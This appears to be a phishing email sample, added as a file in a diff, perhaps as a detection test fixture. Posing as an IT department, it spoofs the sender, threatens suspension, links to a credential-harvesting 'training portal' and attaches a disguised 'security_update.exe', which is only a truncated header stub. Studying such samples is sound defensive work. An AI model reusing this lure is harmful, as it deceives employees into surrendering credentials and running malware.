@@ -1,0 +1,63 @@
+Return-Path: <it-support@company-helpdesk.net>
+Received: from mail.company-helpdesk.net (mail.company-helpdesk.net. [10.20.30.40])
+        by mx.victim.com with ESMTPS id jkl789
+        for <allstaff@victim.com>; Fri, 2 Feb 2024 11:00:00 +0000 (UTC)
+Authentication-Results: mx.victim.com;
+    dkim=fail header.d=company-helpdesk.net;
+    spf=fail;
+    dmarc=fail (p=none)
+Message-ID: <IT-2024-0202@company-helpdesk.net>
+Date: Fri, 2 Feb 2024 11:00:00 +0000
+From: "IT Department" <helpdesk@victim.com>
+Bcc: <allstaff@victim.com>
+Subject: [Action Required] Annual IT Security Training Verification
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_NextPart_400"
+
+------=_NextPart_400
+Content-Type: text/html; charset="UTF-8"
+
+<html>
+<body>
+<p>Dear Employee,</p>
+<p>As part of our annual security compliance requirement, all employees must complete 
+the IT Security Awareness Training by <strong>February 9, 2024</strong>.</p>
+<p>Failure to complete this training may result in temporary suspension of your account access.</p>
+
+<h3>Complete Your Training:</h3>
+<ol>
+<li>Click the link below to access the training portal</li>
+<li>Log in with your corporate credentials</li>
+<li>Complete all 5 modules and the final quiz</li>
+</ol>
+
+<p><a href="http://security-training-portal.xyz/verify?id=employee">
+   Complete Security Training Now
+</a></p>
+
+<p>Your supervisor will be notified if you do not complete this by the deadline.</p>
+
+<p>IT Security Team<br>
+Corporate Help Desk</p>
+
+<hr>
+<p style="font-size: 12px; color: #666;">
+This is an automated message from IT Security. Do not reply directly. 
+For assistance, contact: support@company-helpdesk.net
+</p>
+</body>
+</html>
+
+------=_NextPart_400
+Content-Type: application/octet-stream; name="security_update.exe"
+Content-Disposition: attachment; filename="security_update.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAoAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBi
+ZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADkAAAAgFNcpS4AAAAAAAAAAPAAAAAAA
+AAAQAAAAAAAAABBwBAAAAAAAAAQAAAAAAAAAAAAAAAGgAAAAAAAAAAAAAAAACAAAAAAAEAAAAAA
+AAAAAAAAAAAAAAAAAAAQAAAAAAAAQAAAAAAAAGAAAAABAAAAAAAEAIAAAAAAAABAAAAAA
+AAAAAAAAAAAAAAAAGAAAAAAAAAAAAAA
+
+------=_NextPart_400--
